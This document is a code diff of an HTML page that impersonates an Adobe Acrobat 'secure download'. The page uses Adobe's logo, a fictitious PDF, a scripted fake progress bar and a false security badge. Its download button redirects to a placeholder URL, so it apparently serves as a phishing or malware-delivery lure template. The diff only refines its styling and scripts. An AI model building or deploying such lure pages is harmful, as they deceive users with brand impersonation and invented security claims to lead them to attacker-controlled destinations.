@@ -16,7 +16,7 @@
 
         body {
             font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f8;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -24,203 +24,181 @@
 
         /* Header */
         .header {
-            background: #ffffff;
-            height: 60px;
+            background: #fff;
+            height: 54px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 32px;
-            border-bottom: 1px solid #e5e5e5;
+            padding: 0 28px;
+            border-bottom: 1px solid #e2e2e2;
         }
 
-        .header-brand {
+        .header-left {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
-        .adobe-logo {
-            width: 28px;
-            height: 24px;
+        .header-left svg {
+            width: 24px;
+            height: 20px;
         }
 
-        .brand-text {
-            font-size: 17px;
+        .header-title {
+            font-size: 15px;
             font-weight: 700;
-            color: #1a1a1a;
+            color: #222;
         }
 
-        .header-sep {
-            width: 1px;
-            height: 26px;
-            background: #e0e0e0;
-        }
-
-        .header-label {
-            font-size: 14px;
-            color: #666;
-            font-weight: 500;
-        }
-
-        .header-action {
-            font-size: 14px;
+        .header-right a {
+            font-size: 13px;
             color: #1473e6;
             text-decoration: none;
-            font-weight: 500;
-            padding: 8px 18px;
-            border-radius: 6px;
-            transition: all 0.15s;
+            font-weight: 600;
         }
 
-        .header-action:hover {
-            background: #f0f7ff;
+        .header-right a:hover {
+            text-decoration: underline;
         }
 
-        /* Main content */
+        /* Main */
         .main {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 48px 24px;
+            padding: 40px 20px;
         }
 
         .card {
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04), 0 12px 48px rgba(0,0,0,0.06);
-            padding: 56px 48px;
-            max-width: 480px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 6px 24px rgba(0,0,0,0.05);
+            max-width: 440px;
             width: 100%;
+            padding: 44px 36px;
             text-align: center;
         }
 
-        /* PDF Icon */
-        .pdf-icon {
-            width: 88px;
-            height: 104px;
-            margin: 0 auto 28px;
+        .icon-row {
+            margin-bottom: 24px;
         }
 
-        .file-title {
-            font-size: 20px;
+        .icon-row svg {
+            width: 72px;
+            height: 88px;
+        }
+
+        .card h1 {
+            font-size: 18px;
             font-weight: 700;
             color: #1a1a1a;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
-        .file-info {
-            font-size: 14px;
+        .file-meta {
+            font-size: 13px;
             color: #888;
-            margin-bottom: 36px;
+            margin-bottom: 28px;
         }
 
-        .file-info span {
-            margin: 0 6px;
-            color: #ddd;
+        .file-meta span {
+            margin: 0 4px;
+            color: #ccc;
         }
 
         /* Progress */
-        .progress-wrap {
-            margin-bottom: 32px;
+        .progress-area {
+            margin-bottom: 24px;
         }
 
         .progress-track {
-            width: 100%;
-            height: 5px;
-            background: #e8e8eb;
-            border-radius: 3px;
+            height: 4px;
+            background: #e8e8e8;
+            border-radius: 2px;
             overflow: hidden;
-            margin-bottom: 14px;
+            margin-bottom: 10px;
         }
 
-        .progress-fill {
+        .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #1473e6, #4da3ff);
-            border-radius: 3px;
+            background: #1473e6;
+            border-radius: 2px;
             width: 0%;
-            animation: fillProgress 3.5s ease-out forwards;
+            animation: fill 3s ease-out forwards;
         }
 
-        @keyframes fillProgress {
-            0% { width: 0%; }
-            15% { width: 12%; }
-            35% { width: 32%; }
-            55% { width: 55%; }
-            75% { width: 78%; }
+        @keyframes fill {
+            0% { width: 0; }
             100% { width: 100%; }
         }
 
-        .progress-label {
-            font-size: 14px;
-            color: #888;
+        .progress-text {
+            font-size: 12px;
+            color: #999;
         }
 
-        .progress-percent {
-            font-weight: 600;
-            color: #1a1a1a;
+        .progress-text strong {
+            color: #333;
         }
 
-        /* Download button */
-        .download-btn {
+        /* Button */
+        .dl-btn {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
             background: #1473e6;
-            color: #ffffff;
+            color: #fff;
             border: none;
-            border-radius: 26px;
-            padding: 16px 40px;
-            font-size: 16px;
+            border-radius: 20px;
+            padding: 12px 32px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: background 0.2s;
             opacity: 0;
-            animation: showButton 0.5s ease forwards 3.7s;
+            animation: fadeIn 0.4s ease forwards 3.2s;
         }
 
-        .download-btn:hover {
+        .dl-btn:hover {
             background: #0d66d0;
-            box-shadow: 0 6px 24px rgba(20, 115, 230, 0.25);
-            transform: translateY(-1px);
         }
 
-        .download-btn svg {
-            width: 20px;
-            height: 20px;
+        .dl-btn svg {
+            width: 16px;
+            height: 16px;
         }
 
-        @keyframes showButton {
+        @keyframes fadeIn {
             to { opacity: 1; }
         }
 
-        /* Security badge */
-        .security-badge {
+        .security-note {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #b0b0b0;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
-            font-size: 13px;
-            color: #a0a0a0;
+            gap: 5px;
         }
 
-        .security-badge svg {
-            width: 16px;
-            height: 16px;
-            fill: #a0a0a0;
+        .security-note svg {
+            width: 13px;
+            height: 13px;
+            fill: #b0b0b0;
         }
 
         /* Footer */
         .footer {
             text-align: center;
-            padding: 20px 24px;
-            font-size: 12px;
-            color: #b8b8b8;
+            padding: 16px;
+            font-size: 11px;
+            color: #bbb;
         }
 
         .footer a {
-            color: #b8b8b8;
+            color: #bbb;
             text-decoration: none;
         }
 
@@ -228,57 +206,53 @@
             text-decoration: underline;
         }
 
-        /* Print */
         @media print {
             body { background: #fff; }
-            .card { box-shadow: none; border: 1px solid #e0e0e0; }
-            .download-btn { opacity: 1; animation: none; }
-            .progress-fill { width: 100%; animation: none; }
+            .card { box-shadow: none; border: 1px solid #ddd; }
+            .dl-btn { opacity: 1; animation: none; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .progress-bar { width: 100%; animation: none; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
     <header class="header">
-        <div class="header-brand">
-            <svg class="adobe-logo" viewBox="0 0 30 26" fill="none">
+        <div class="header-left">
+            <svg viewBox="0 0 30 26" fill="none">
                 <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                 <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                 <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
             </svg>
-            <span class="brand-text">Adobe Acrobat</span>
-            <div class="header-sep"></div>
-            <span class="header-label">Secure Download</span>
+            <span class="header-title">Adobe Acrobat</span>
         </div>
-        <a href="#" class="header-action">Sign in</a>
+        <div class="header-right">
+            <a href="#">Sign in</a>
+        </div>
     </header>
 
-    <!-- Main -->
     <main class="main">
         <div class="card">
-            <!-- PDF Icon -->
-            <svg class="pdf-icon" viewBox="0 0 88 104" fill="none">
-                <path d="M0 8C0 3.58 3.58 0 8 0H56L88 32V96C88 100.42 84.42 104 80 104H8C3.58 104 0 100.42 0 96V8Z" fill="#F8F8FA" stroke="#E8E8EB" stroke-width="1"/>
-                <path d="M56 0L88 32H64C59.58 32 56 28.42 56 24V0Z" fill="#E8E8EB"/>
-                <rect x="16" y="56" rx="3" width="56" height="6" fill="#E0E0E0"/>
-                <rect x="16" y="70" rx="3" width="42" height="6" fill="#E0E0E0"/>
-                <rect x="16" y="84" rx="3" width="50" height="6" fill="#E0E0E0"/>
-                <text x="44" y="44" text-anchor="middle" fill="#1473e6" font-size="17" font-weight="700" font-family="sans-serif">PDF</text>
-            </svg>
-
-            <h1 class="file-title">Document_2026.pdf</h1>
-            <p class="file-info">PDF Document <span>•</span> 2.4 MB <span>•</span> 12 pages</p>
-
-            <!-- Progress -->
-            <div class="progress-wrap">
-                <div class="progress-track">
-                    <div class="progress-fill"></div>
-                </div>
-                <p class="progress-label">Preparing your document... <span class="progress-percent" id="percent">0%</span></p>
+            <div class="icon-row">
+                <svg viewBox="0 0 72 88" fill="none">
+                    <path d="M0 6C0 2.69 2.69 0 6 0H44L72 28V82C72 85.31 69.31 88 66 88H6C2.69 88 0 85.31 0 82V6Z" fill="#F5F5F8" stroke="#E0E0E0" stroke-width="1"/>
+                    <path d="M44 0L72 28H50C46.69 28 44 25.31 44 22V0Z" fill="#E0E0E0"/>
+                    <rect x="14" y="46" rx="2" width="44" height="5" fill="#DBDBE0"/>
+                    <rect x="14" y="58" rx="2" width="32" height="5" fill="#DBDBE0"/>
+                    <rect x="14" y="70" rx="2" width="38" height="5" fill="#DBDBE0"/>
+                    <text x="36" y="36" text-anchor="middle" fill="#1473e6" font-size="14" font-weight="700" font-family="sans-serif">PDF</text>
+                </svg>
             </div>
 
-            <!-- Download Button -->
-            <button class="download-btn" id="downloadBtn" onclick="window.location.href='REDIRECT_URL_HERE'">
+            <h1>Document_2026.pdf</h1>
+            <p class="file-meta">PDF <span>&middot;</span> 2.4 MB <span>&middot;</span> 12 pages</p>
+
+            <div class="progress-area">
+                <div class="progress-track">
+                    <div class="progress-bar"></div>
+                </div>
+                <p class="progress-text" id="progressLabel">Preparing document&hellip; <strong id="pct">0%</strong></p>
+            </div>
+
+            <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                     <polyline points="7 10 12 15 17 10"/>
@@ -287,14 +261,13 @@
                 Download PDF
             </button>
 
-            <div class="security-badge">
+            <div class="security-note">
                 <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
                 Secured with Adobe Document Security
             </div>
         </div>
     </main>
 
-    <!-- Footer -->
     <footer class="footer">
         &copy; 2026 Adobe. All rights reserved. &middot;
         <a href="#">Privacy</a> &middot;
@@ -302,23 +275,17 @@
     </footer>
 
     <script>
-        var percentEl = document.getElementById('percent');
-        var steps = [
-            { time: 0, value: 0 },
-            { time: 550, value: 12 },
-            { time: 1250, value: 32 },
-            { time: 1950, value: 55 },
-            { time: 2650, value: 78 },
-            { time: 3500, value: 100 }
-        ];
-        steps.forEach(function(step) {
-            setTimeout(function() {
-                percentEl.textContent = step.value + '%';
-                if (step.value === 100) {
-                    document.querySelector('.progress-label').innerHTML = 'Your document is ready';
-                }
-            }, step.time);
-        });
+        (function() {
+            var pct = document.getElementById('pct');
+            var label = document.getElementById('progressLabel');
+            var vals = [0, 10, 28, 50, 74, 100];
+            vals.forEach(function(v, i) {
+                setTimeout(function() {
+                    pct.textContent = v + '%';
+                    if (v === 100) label.innerHTML = 'Ready to download';
+                }, i * 600);
+            });
+        })();
     </script>
 </body>
 </html>
